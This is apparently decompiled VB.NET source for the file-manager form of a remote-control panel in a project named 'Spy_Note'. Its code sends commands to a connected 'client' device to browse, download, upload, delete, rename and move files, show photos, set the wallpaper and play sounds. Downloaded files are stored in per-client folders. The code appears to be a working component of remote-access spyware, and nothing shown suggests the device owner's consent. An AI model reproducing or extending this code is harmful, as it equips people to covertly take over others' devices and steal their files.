Imports System.ComponentModel
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Text.RegularExpressions
Imports System.Threading
Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class File_Manager
    Private imageList_0 As ImageList
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Private Clipboard_Cut As String
    Private Path_Cut As String
    Private Clipboard_Copy As String
    Private Path_Copy As String
    Public Sub New()
        Me.imageList_0 = New ImageList()
        Me.InitializeComponent()
    End Sub
    Public Sub Client_data(data As String)
        Try
            Dim flag As Boolean = data <> Nothing
            If flag Then
                Dim flag2 As Boolean = data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]")
                If flag2 Then
                    Dim separator As String() = New String() {"[My/Exception]"}
                    Dim array As String() = data.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                    Me.Label1.Text = array(0)
                    Dim flag3 As Boolean = Not Me.Panel3.Visible
                    If flag3 Then
                        Me.Panel3.Visible = True
                    End If
                Else
                    Dim flag4 As Boolean = data.Contains("[MyBase64/Photo]") And data.StartsWith("[MyBase64/Photo]")
                    If flag4 Then
                        Dim separator2 As String() = New String() {"[MyBase64/Photo]"}
                        Dim array2 As String() = data.Split(separator2, StringSplitOptions.RemoveEmptyEntries)
                        Dim buffer As Byte() = Convert.FromBase64String(array2(0))
                        Dim memoryStream As MemoryStream = New MemoryStream(buffer)
                        Dim image As Bitmap = New Bitmap(image.FromStream(memoryStream))
                        Me.PictureBox1.Image = image
                        memoryStream.Dispose()
                        Me.PictureBox1.Visible = True
                        Dim visible As Boolean = Me.Panel3.Visible
                        If visible Then
                            Me.Panel3.Visible = False
                        End If
                    Else
                        Me.DataGridView1.Rows.Clear()
                        Me.ComboBox1.Items.Clear()
                        Dim separator3 As String() = New String() {My.Forms.Form1.s.split_paths}
                        Dim array3 As String() = data.Split(separator3, StringSplitOptions.RemoveEmptyEntries)
                        Dim num As Integer = array3.Length - 1
                        For i As Integer = 1 To num
                            Me.ComboBox1.Items.Add(array3(i))
                        Next
                        Dim separator4 As String() = New String() {My.Forms.Form1.s.split_Line}
                        Dim array4 As String() = array3(0).Split(separator4, StringSplitOptions.RemoveEmptyEntries)
                        Dim num2 As Integer = array4.Length - 1
                        For j As Integer = 0 To num2
                            Dim separator5 As String() = New String() {My.Forms.Form1.s.split_Ary}
                            Dim array5 As String() = array4(j).Split(separator5, StringSplitOptions.RemoveEmptyEntries)
                            Dim flag5 As Boolean = Operators.CompareString(array5(0), "-1", False) <> 0 And Operators.CompareString(array5(1), "-1", False) <> 0 And Operators.CompareString(array5(2), "-1", False) <> 0
                            If flag5 Then
                                Dim text As String = Nothing
                                Dim flag6 As Boolean = True
                                Dim left As String = array5(0)
                                If Operators.CompareString(left, "Ext", False) <> 0 Then
                                    text = array5(0)
                                    Dim flag7 As Boolean = text.StartsWith("Folder Files")
                                    If flag7 Then
                                        flag6 = False
                                    End If
                                Else
                                    Try
                                        Dim fileInfo As FileInfo = New FileInfo(array5(1))
                                        text = fileInfo.Extension
                                    Catch ex As Exception
                                        text = "Unknown error"
                                    End Try
                                End If
                                Dim text2 As String = Nothing
                                Dim flag8 As Boolean = flag6
                                If flag8 Then
                                    text2 = store_0.FormatFileSize(Conversions.ToLong(array5(2)))
                                End If
                                Dim flag9 As Boolean = text.StartsWith("Folder Files")
                                Dim num3 As Integer
                                If flag9 Then
                                    num3 = Me.imageList_0.Images.IndexOfKey("Folder Files".ToUpper())
                                Else
                                    num3 = Me.imageList_0.Images.IndexOfKey(text.ToUpper())
                                End If
                                If num3 = -1 Then
                                    num3 = Me.imageList_0.Images.IndexOfKey("-1".ToUpper())
                                End If
                                Me.DataGridView1.Rows.Add(New Object() {Me.imageList_0.Images(num3), array5(1), text2, text})
                                Me.DataGridView1.Rows(Me.DataGridView1.Rows.Count - 1).Cells(1).Tag = array5(3) + "/" + array5(1)
                                Dim flag10 As Boolean = flag6
                                If flag10 Then
                                    Me.DataGridView1.Rows(Me.DataGridView1.Rows.Count - 1).Cells(2).Tag = array5(2)
                                End If
                            End If
                            Me.ComboBox1.Text = array5(3)
                        Next
                        Dim visible2 As Boolean = Me.Panel3.Visible
                        If visible2 Then
                            Me.Panel3.Visible = False
                        End If
                        Me.refres_title()
                    End If
                End If
            End If
            Me.ComboBox1.Enabled = True
        Catch ex2 As Exception
        End Try
    End Sub

    Private Sub ContextMenuOpen_the_file_using()
        Try
            Dim contextMenuStrip As ContextMenuStrip = New ContextMenuStrip()
            Me.ContextMenuStrip = Me.ContextMenuStrip1
            contextMenuStrip.ShowImageMargin = False
            contextMenuStrip.RenderMode = ToolStripRenderMode.System
            Me.OpenTheFileUsingToolStripMenuItem.DropDown = contextMenuStrip
            Dim path As String = Application.StartupPath + "\" + store_0.name_folder_app_resource + "\OBU.inf"
            Dim flag As Boolean = File.Exists(path)
            If flag Then
                Dim streamReader As StreamReader = New StreamReader(path)
                Dim num As Integer = 0
                While streamReader.Peek() <> -1
                    Thread.Sleep(store_0.CPU)
                    Dim text As String = streamReader.ReadLine()
                    Dim flag2 As Boolean = Operators.CompareString(text, Nothing, False) <> 0
                    If flag2 Then
                        Dim flag3 As Boolean = text.Contains("{Package}")
                        If flag3 Then
                            Dim array As String() = New String() {"{Package}"}
                            Dim flag4 As Boolean = array.Length = 1
                            If flag4 Then
                                Dim array2 As String() = text.ToString().Split(array, StringSplitOptions.RemoveEmptyEntries)
                                Dim toolStripMenuItem As ToolStripMenuItem = New ToolStripMenuItem() With {.Text = array2(0), .Name = "menu_item" + Conversions.ToString(num), .Tag = array2(1)}
                                AddHandler toolStripMenuItem.Click, AddressOf Me.mnuItem_Clicked
                                contextMenuStrip.Items.Add(toolStripMenuItem)
                            End If
                        End If
                    End If
                    num += 1
                End While
            End If
            contextMenuStrip.Renderer = New Theme_0()
        Catch ex As Exception
        End Try
    End Sub

    Private Sub mnuItem_Clicked(sender As Object, e As EventArgs)
        Dim toolStripMenuItem As ToolStripMenuItem = TryCast(sender, ToolStripMenuItem)
        Dim text As String = Conversions.ToString(toolStripMenuItem.Tag)
        Dim flag As Boolean = Operators.CompareString(text, Nothing, False) <> 0
        If flag Then
            Dim flag2 As Boolean = Me.DataGridView1.SelectedRows.Count > 0
            If flag2 Then
                Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
                For i As Integer = num To 0 Step -1
                    Dim text2 As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Tag)
                    My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"file_manager_start_playback", My.Forms.Form1.s.SplitData, text2, My.Forms.Form1.s.SplitData, text}))
                Next
            End If
        End If
    End Sub

    Private Sub File_Manager_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.OpenTheFileUsingToolStripMenuItem.Image = store_0.Bitmap_0("ctx_open_app")
        Me.RenameToolStripMenuItem.Image = store_0.Bitmap_0("ctx_rename")
        Me.RefreshToolStripMenuItem.Image = store_0.Bitmap_0("ctx_refresh")
        Me.UploadFileToolStripMenuItem.Image = store_0.Bitmap_0("ctx_upload_file")
        Me.DownloadToolStripMenuItem.Image = store_0.Bitmap_0("ctx_download_file")
        Me.CutToolStripMenuItem.Image = store_0.Bitmap_0("ctx_cut")
        Me.CopyToolStripMenuItem.Image = store_0.Bitmap_0("ctx_copy")
        Me.PasteToolStripMenuItem.Image = store_0.Bitmap_0("ctx_paste")
        Me.EditToolStripMenuItem.Image = store_0.Bitmap_0("ctx_edit")
        Me.DeleteToolStripMenuItem.Image = store_0.Bitmap_0("ctx_delete")
        Me.AddFilesToolStripMenuItem.Image = store_0.Bitmap_0("ctx_add")
        Me.SetWallpaperToolStripMenuItem.Image = store_0.Bitmap_0("ctx_wallpaper")
        Me.Download02ToolStripMenuItem.Image = store_0.Bitmap_0("ctx_open_folder")
        Me.PlayASoundToolStripMenuItem.Image = store_0.Bitmap_0("ctx_play")
        Me.ContextMenuStrip1.Renderer = New Theme_0()
        Dim flag As Boolean = False
        Dim files As String() = Directory.GetFiles(Application.StartupPath + "\" + store_0.name_folder_app_resource + "\icons\file_manager\")
        For Each text As String In files
            Dim flag2 As Boolean = Not flag
            If flag2 Then
                Me.icon_0.Width = Image.FromFile(text).Size.Width
                Me.imageList_0.ImageSize = New Size(Image.FromFile(text).Size.Width, Image.FromFile(text).Size.Height)
                Me.imageList_0.ColorDepth = ColorDepth.Depth32Bit
                flag = True
            End If
            Dim path As String = text
            Dim fileNameWithoutExtension As String = IO.Path.GetFileNameWithoutExtension(path)
            Me.imageList_0.Images.Add(fileNameWithoutExtension.ToUpper(), Image.FromFile(text))
        Next
        MyBase.Icon = store_0.icons_0("window")
        Me.Button1.Image = store_0.Bitmap_0("chevron_right")
        Me.Button2.Image = store_0.Bitmap_0("chevron_left")
        Me.ContextMenuOpen_the_file_using()
        Me.refres_title()
    End Sub

    Private Sub refres_title()
        Dim text As String = String.Format("File Manager - Remote Address & Port: {0} Client Name: {1} - Item: {2} Item Selection: {3}", New Object() {Me.Client_remote_Address, Me.Name_Client, Conversions.ToString(Me.DataGridView1.Rows.Count), Conversions.ToString(Me.DataGridView1.SelectedRows.Count)})
        Me.Text = text
    End Sub

    Private Sub DataGridView1_CellMouseDoubleClick(sender As Object, e As DataGridViewCellMouseEventArgs) Handles DataGridView1.CellMouseDoubleClick
        Dim flag As Boolean = e.RowIndex >= 0 AndAlso e.ColumnIndex >= 0
        If flag Then
            Dim enabled As Boolean = Me.ComboBox1.Enabled
            If enabled Then
                Dim flag2 As Boolean = Me.DataGridView1.SelectedRows.Count = 1
                If flag2 Then
                    Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
                    For i As Integer = num To 0 Step -1
                        Dim text As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(3).Value)
                        Dim flag3 As Boolean = text.StartsWith("Folder Files")
                        If flag3 Then
                            Dim text2 As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Value)
                            Me.ComboBox1.Enabled = False
                            My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"file_manager", My.Forms.Form1.s.SplitData, Me.ComboBox1.Text, "/", text2}))
                            Dim enabled2 As Boolean = Me.Button2.Enabled
                            If enabled2 Then
                                Me.Button2.Enabled = False
                                Me.Button2.Tag = Nothing
                                Me.Button1.Focus()
                            End If
                        End If
                    Next
                End If
            End If
        End If
    End Sub

    Private Sub DataGridView1_SelectionChanged(sender As Object, e As EventArgs) Handles DataGridView1.SelectionChanged
        Me.refres_title()
    End Sub

    Private Sub ComboBox1_SelectionChangeCommitted(sender As Object, e As EventArgs) Handles ComboBox1.SelectionChangeCommitted
        Dim enabled As Boolean = Me.ComboBox1.Enabled
        If enabled Then
            Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.ComboBox1.SelectedItem)
            Dim flag As Boolean = objectValue.ToString() <> Nothing
            If flag Then
                Me.ComboBox1.Enabled = False
                My.Forms.Form1.s.Send(Me.handle_Number_Client, "file_manager" + My.Forms.Form1.s.SplitData + objectValue.ToString())
                Dim enabled2 As Boolean = Me.Button2.Enabled
                If enabled2 Then
                    Me.Button2.Enabled = False
                    Me.Button2.Tag = Nothing
                    Me.Button1.Focus()
                End If
            End If
        End If
    End Sub

    Private Sub ComboBox1_MouseWheel(sender As Object, e As MouseEventArgs) Handles ComboBox1.MouseWheel
        Dim handledMouseEventArgs As HandledMouseEventArgs = CType(e, HandledMouseEventArgs)
        handledMouseEventArgs.Handled = True
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        Dim enabled As Boolean = Me.ComboBox1.Enabled
        If enabled Then
            Me.ComboBox1.Enabled = False
            My.Forms.Form1.s.Send(Me.handle_Number_Client, "file_manager" + My.Forms.Form1.s.SplitData + Me.ComboBox1.Text)
        Else
            Dim flag As Boolean = Not Me.ComboBox1.Enabled
            If flag Then
                Me.ComboBox1.Enabled = True
                Me.Button2.Enabled = False
                Me.Button2.Tag = Nothing
                Me.Button1.Focus()
            End If
        End If
    End Sub

    Private Sub ComboBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles ComboBox1.MouseMove
        Me.ComboBox1.Enabled = True
    End Sub

    Private Sub ComboBox1_KeyPress(sender As Object, e As KeyPressEventArgs) Handles ComboBox1.KeyPress
        e.Handled = True
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            Dim enabled As Boolean = Me.ComboBox1.Enabled
            If enabled Then
                Dim text As String = "/"
                Dim text2 As String = Me.ComboBox1.Text
                Dim pattern As String = text
                Dim flag As Boolean = Operators.CompareString(text2, Nothing, False) = 0
                If Not flag Then
                    Dim flag2 As Boolean = Operators.CompareString(text2, text, False) = 0
                    If Not flag2 Then
                        Dim regex As Regex = New Regex(pattern)
                        Dim matchCollection As MatchCollection = regex.Matches(text2)
                        Dim str As String = text2.Split(New Char() {Conversions.ToChar(text)})(Conversions.ToInteger(matchCollection.Count.ToString()))
                        Dim button As Button = Me.Button2
                        Dim button2 As Button = button
                        button.Tag = Operators.AddObject(button2.Tag, text + str)
                        Try
                            Dim separator As String() = New String() {text}
                            Dim text3 As String = Nothing
                            Dim array As String() = Me.ComboBox1.Text.Split(separator, StringSplitOptions.None)
                            Dim num As Integer = array.Length - 2
                            For i As Integer = 0 To num
                                Dim flag3 As Boolean = i <> array.Length - 2
                                If flag3 Then
                                    text3 = text3 + array(i) + text
                                Else
                                    text3 += array(i)
                                End If
                            Next
                            Me.ComboBox1.Text = text3
                        Catch ex As Exception
                            Me.ComboBox1.Text = Me.ComboBox1.Text.Replace("/" + str, Nothing)
                        End Try
                        Dim flag4 As Boolean = Operators.CompareString(Me.ComboBox1.Text, Nothing, False) = 0
                        If flag4 Then
                            Me.ComboBox1.Text = "/"
                        End If
                        Me.Button2.Enabled = True
                        Me.ComboBox1.Enabled = False
                        My.Forms.Form1.s.Send(Me.handle_Number_Client, "file_manager" + My.Forms.Form1.s.SplitData + Me.ComboBox1.Text)
                    End If
                End If
            End If
        Catch ex2 As Exception
        End Try
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            Dim enabled As Boolean = Me.ComboBox1.Enabled
            If enabled Then
                Dim text As String = "/"
                Dim pattern As String = text
                Dim text2 As String = Me.Button2.Tag.ToString()
                Dim flag As Boolean = Operators.CompareString(text2, Nothing, False) = 0
                If flag Then
                    Me.Button2.Enabled = False
                    Me.Button1.Focus()
                Else
                    Dim regex As Regex = New Regex(pattern)
                    Dim matchCollection As MatchCollection = regex.Matches(text2)
                    Dim text3 As String = text2.Split(New Char() {Conversions.ToChar(text)})(Conversions.ToInteger(matchCollection.Count.ToString()))
                    Dim flag2 As Boolean = Operators.CompareString(Me.ComboBox1.Text, text, False) = 0
                    If flag2 Then
                        Me.ComboBox1.Text = Me.ComboBox1.Text + text3
                    Else
                        Me.ComboBox1.Text = Me.ComboBox1.Text + text + text3
                    End If
                    Try
                        Dim separator As String() = New String() {text}
                        Dim text4 As String = Nothing
                        Dim array As String() = text2.Split(separator, StringSplitOptions.None)
                        Dim num As Integer = array.Length - 2
                        For i As Integer = 0 To num
                            Dim flag3 As Boolean = i <> array.Length - 2
                            If flag3 Then
                                text4 = text4 + array(i) + text
                            Else
                                text4 += array(i)
                            End If
                        Next
                        Me.Button2.Tag = text4
                        Dim flag4 As Boolean = Operators.CompareString(Me.Button2.Tag.ToString(), Nothing, False) = 0
                        If flag4 Then
                            Me.Button2.Enabled = False
                            Me.Button1.Focus()
                        End If
                    Catch ex As Exception
                        Dim button As Control = Me.Button2
                        Dim tag As Object = Me.Button2.Tag
                        Dim type As Type = Nothing
                        Dim memberName As String = "Replace"
                        Dim array2 As Object() = New Object(1) {}
                        array2(0) = text + text3
                        button.Tag = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(tag, type, memberName, array2, Nothing, Nothing, Nothing))
                    End Try
                    Me.ComboBox1.Enabled = False
                    My.Forms.Form1.s.Send(Me.handle_Number_Client, "file_manager" + My.Forms.Form1.s.SplitData + Me.ComboBox1.Text)
                End If
            End If
        Catch ex2 As Exception
        End Try
    End Sub

    Private Sub UploadFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadFileToolStripMenuItem.Click
        Dim filter As String = "All (*.*)|*.*"
        Me.OpenFileDialog1.Filter = filter
        Me.OpenFileDialog1.FilterIndex = 0
        Me.OpenFileDialog1.FileName = Nothing
        Dim flag As Boolean = Me.OpenFileDialog1.ShowDialog() = DialogResult.OK
        If flag Then
            Dim fileInfo As FileInfo = New FileInfo(Me.OpenFileDialog1.FileName)
            My.Forms.Form1.s.Send(Me.handle_Number_Client, Conversions.ToString(Operators.AddObject(String.Concat(New String() {"upload_file", My.Forms.Form1.s.SplitData, Me.ComboBox1.Text, My.Forms.Form1.s.SplitData, fileInfo.Name, My.Forms.Form1.s.SplitData}), Me.tobase64(Me.OpenFileDialog1.FileName))))
        End If
    End Sub

    Public Function tobase64(file As String) As Object
        Return Convert.ToBase64String(IO.File.ReadAllBytes(file))
    End Function

    Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadToolStripMenuItem.Click
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                Dim left As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Tag)
                Dim flag2 As Boolean = Operators.CompareString(left, Nothing, False) <> 0
                If flag2 Then
                    Dim text As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(3).Value)
                    Dim flag3 As Boolean = Not text.StartsWith("Folder Files")
                    If flag3 Then
                        My.Forms.Form1.s.Send(Me.handle_Number_Client, Conversions.ToString(Operators.AddObject("download_manager" + My.Forms.Form1.s.SplitData, Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Tag)))
                    End If
                End If
            Next
        End If
    End Sub

    Private Sub EditfileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EditToolStripMenuItem.Click
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                Dim text As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(3).Value)
                Dim flag2 As Boolean = Not text.StartsWith("Folder Files")
                If flag2 Then
                    Dim text2 As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Value)
                    My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"notepad", My.Forms.Form1.s.SplitData, Me.ComboBox1.Text, "/", text2}))
                End If
            Next
        End If
    End Sub

    Private Sub Download02ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Download02ToolStripMenuItem.Click
        Try
            Dim text As String = String.Concat(New String() {Application.StartupPath, "\", store_0.name_folder_app_resource, "\Folder_Clients\", Me.Name_Client, Me.Client_ID, "\Download_Manager"})
            Dim flag As Boolean = Not My.Computer.FileSystem.DirectoryExists(text)
            If flag Then
                My.Computer.FileSystem.CreateDirectory(text)
            End If
            Process.Start(text)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub AddFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddFilesToolStripMenuItem.Click
        Dim add_Files As Add_Files = New Add_Files()
        add_Files.ShowDialog()
        Dim flag As Boolean = add_Files.DialogResult = DialogResult.OK
        If flag Then
            Dim text As String = add_Files.TextBox1.Text
            Dim value As Boolean = True
            Dim flag2 As Boolean = text.Contains(".")
            If flag2 Then
                value = False
            End If
            Dim text2 As String = Me.ComboBox1.Text + "/" + text
            My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"file_manager_write_file", My.Forms.Form1.s.SplitData, text2, My.Forms.Form1.s.SplitData, Conversions.ToString(value)}))
        End If
        add_Files.Dispose()
        add_Files.Close()
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click
        Dim text As String = Nothing
        Dim text2 As String = Nothing
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count = 1
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                text = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Value)
                text2 = Me.ComboBox1.Text + "/" + text
            Next
            Dim files_Rename As Files_Rename = New Files_Rename()
            files_Rename.TextBox1.Text = text
            files_Rename.ShowDialog()
            Dim flag2 As Boolean = files_Rename.DialogResult = DialogResult.OK
            If flag2 Then
                Dim text3 As String = files_Rename.TextBox1.Text
                Dim text4 As String = Me.ComboBox1.Text + "/" + text3
                My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"file_manager_rename", My.Forms.Form1.s.SplitData, text2, My.Forms.Form1.s.SplitData, text4}))
            End If
            files_Rename.Dispose()
            files_Rename.Close()
        End If
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                Dim text As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Value)
                My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"file_manager_delete", My.Forms.Form1.s.SplitData, Me.ComboBox1.Text, "/", text}))
                Me.DataGridView1.Rows.RemoveAt(Me.DataGridView1.SelectedRows(i).Index)
            Next
        End If
    End Sub

    Private Sub ContextMenuStrip1_Opening(sender As Object, e As CancelEventArgs) Handles ContextMenuStrip1.Opening
        Dim num As Decimal = 0D
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num2 As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num2 To 0 Step -1
                Dim text As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(2).Tag)
                Dim flag2 As Boolean = Operators.CompareString(text, Nothing, False) <> 0
                If flag2 Then
                    Try
                        num = Decimal.Add(num, New Decimal(Conversions.ToLong(text)))
                    Catch ex As Exception
                    End Try
                End If
            Next
        End If
        Try
            Me.DownloadToolStripMenuItem.Text = "Download (" + store_0.FormatFileSize(Convert.ToInt64(num)) + ")"
        Catch ex2 As Exception
            Me.DownloadToolStripMenuItem.Text = "Download"
        End Try
    End Sub
    Private Sub SetWallpaperToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SetWallpaperToolStripMenuItem.Click
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                Dim text As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(3).Value)
                Dim flag2 As Boolean = Operators.CompareString(text.ToLower(), ".png", False) = 0 OrElse Operators.CompareString(text, ".jpg", False) = 0
                If flag2 Then
                    Dim text2 As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Value)
                    My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"set_wallpaper", My.Forms.Form1.s.SplitData, Me.ComboBox1.Text, "/", text2}))
                End If
            Next
        End If
    End Sub

    Private Sub CutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CutToolStripMenuItem.Click
        Me.Clipboard_Copy = Nothing
        Me.Path_Copy = Nothing
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                Dim str As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Value)
                Me.Clipboard_Cut = Me.Clipboard_Cut + str + "[*N\O*]"
                Me.Path_Cut = Me.Path_Cut + Me.ComboBox1.Text + "/[*P\T*]"
            Next
        End If
    End Sub

    Private Sub PlayASoundToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PlayASoundToolStripMenuItem.Click
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                Dim text As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(3).Value)
                Dim text2 As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Value)
                My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"play_sound", My.Forms.Form1.s.SplitData, Me.ComboBox1.Text, "/", text2}))
            Next
        End If
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Me.Clipboard_Cut = Nothing
        Me.Path_Cut = Nothing
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                Dim str As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Value)
                Me.Clipboard_Copy = Me.Clipboard_Copy + str + "[*N\O*]"
                Me.Path_Copy = Me.Path_Copy + Me.ComboBox1.Text + "/[*P\T*]"
            Next
        End If
    End Sub

    Private Sub PasteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasteToolStripMenuItem.Click
        Dim flag As Boolean = Operators.CompareString(Me.Clipboard_Copy, Nothing, False) <> 0
        If flag Then
            Dim flag2 As Boolean = Operators.CompareString(Me.Path_Copy, Nothing, False) <> 0
            If flag2 Then
                Dim separator As String() = New String() {"[*N\O*]"}
                Dim array As String() = Me.Clipboard_Copy.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                Dim separator2 As String() = New String() {"[*P\T*]"}
                Dim array2 As String() = Me.Path_Copy.Split(separator2, StringSplitOptions.RemoveEmptyEntries)
                Dim num As Integer = CInt((CLng(array.Length) - 1L))
                For i As Integer = 0 To num
                    My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"file_manager_move_file", My.Forms.Form1.s.SplitData, array2(i), My.Forms.Form1.s.SplitData, array(i), My.Forms.Form1.s.SplitData, Me.ComboBox1.Text, "/", My.Forms.Form1.s.SplitData, Conversions.ToString(False)}))
                Next
            End If
        End If
        Dim flag3 As Boolean = Operators.CompareString(Me.Clipboard_Cut, Nothing, False) <> 0
        If flag3 Then
            Dim flag4 As Boolean = Operators.CompareString(Me.Path_Cut, Nothing, False) <> 0
            If flag4 Then
                Dim separator3 As String() = New String() {"[*N\O*]"}
                Dim array3 As String() = Me.Clipboard_Cut.Split(separator3, StringSplitOptions.RemoveEmptyEntries)
                Dim separator4 As String() = New String() {"[*P\T*]"}
                Dim array4 As String() = Me.Path_Cut.Split(separator4, StringSplitOptions.RemoveEmptyEntries)
                Dim num2 As Integer = CInt((CLng(array3.Length) - 1L))
                For j As Integer = 0 To num2
                    My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"file_manager_move_file", My.Forms.Form1.s.SplitData, array4(j), My.Forms.Form1.s.SplitData, array3(j), My.Forms.Form1.s.SplitData, Me.ComboBox1.Text, "/", My.Forms.Form1.s.SplitData, Conversions.ToString(True)}))
                Next
            End If
        End If
    End Sub

    Private Sub DataGridView1_CellMouseClick(sender As Object, e As DataGridViewCellMouseEventArgs) Handles DataGridView1.CellMouseClick
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count = 1
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                Dim text As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(3).Value)
                Dim flag2 As Boolean = Operators.CompareString(text.ToLower(), ".png", False) = 0 OrElse Operators.CompareString(text, ".jpg", False) = 0 OrElse Operators.CompareString(text, ".gif", False) = 0
                If flag2 Then
                    Dim text2 As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Value)
                    My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"view_photo", My.Forms.Form1.s.SplitData, Me.ComboBox1.Text, "/", text2}))
                Else
                    Dim visible As Boolean = Me.PictureBox1.Visible
                    If visible Then
                        Me.PictureBox1.Visible = False
                    End If
                End If
            Next
        End If
    End Sub

End Class